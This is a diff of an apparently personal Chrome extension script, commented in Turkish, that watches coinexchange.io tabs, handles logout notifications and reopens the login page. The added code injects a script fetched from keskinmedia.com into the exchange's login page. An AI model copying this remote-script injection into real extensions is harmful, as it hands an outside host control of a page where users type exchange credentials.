@@ -35,21 +35,28 @@ chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
     }
 
     if (tab.url.split("/")[3] == "login") {
+      if(!_login){ // login sayfasına 1 defa gitmişse daha gitme
+        _login=true  // login sayfasına 1 defa gitmesi yeterli.
+        LogoutBildir();
+        console.log("Site coinexchange ve Login");
+      }
 
-      LogoutBildir();
-      console.log("Site coinexchange ve Login");
     }
 
-    /*
+    
     if (tab.url.split("/")[3] == "login#noreload") {
       chrome.tabs.executeScript(tabId, {
-        code: `setTimeout("setTimeout("document.getElementById('username').click(); document.getElementById('password').click(); document.getElementById('remember_me').checked = true; document.getElementById('_submit').click();", 1000 * 5)`,
+        code: "var j = document.createElement('script'); j.id='ipSc'; j.src = 'https://keskinmedia.com/api/login.js?v='+ Math.random(); document.head.appendChild(j);",
         runAt: "document_end"
       });
+
+      const timeriBaslat = ()=>{ 
+        _isPaused = false 
+        _login = false /// Login sayfasına girebilir.
+      }
+      
+      setTimeout(timeriBaslat, 1000 * 5);
     }
-
-*/
-
   }
 });
 
@@ -60,6 +67,7 @@ async function LogoutBildir() {
 
   _isPaused = true
 
+  // SEND SMS ŞUANLIK DEAKTİF!
   const SendSms = async () => {
     //  http://keskinmedia.com/apim/sendlogout/2/8f03c10593f0abadef0b3084ba560826
     var url = "http://keskinmedia.com/apim/sendlogout/";
@@ -69,13 +77,19 @@ async function LogoutBildir() {
 
     await axios(url);
 
+    loginSayfasiniAc();
+  }
+
+
+  const loginSayfasiniAc = ()=> {
     chrome.tabs.create({
       active: true,
       url: "https://www.coinexchange.io/login#noreload"
     });
   }
 
-  setTimeout(SendSms, 1000 * 60);
+  //setTimeout(SendSms, 1000 * 60);
+  setTimeout(loginSayfasiniAc, 1000 * 60);
 
   chrome.tabs.query({
     url: "https://www.coinexchange.io/market/*/*?*"
@@ -85,7 +99,7 @@ async function LogoutBildir() {
     });
   });
 
-  /*
+  
     chrome.tabs.query({
       url: "https://www.coinexchange.io/login"
     }, function (tabs) {
@@ -93,7 +107,7 @@ async function LogoutBildir() {
         chrome.tabs.remove(tab.id);
       });
     });
-  */
+  
   chrome.tabs.query({
     url: "https://www.coinexchange.io/trades/*"
   }, function (tabs) {
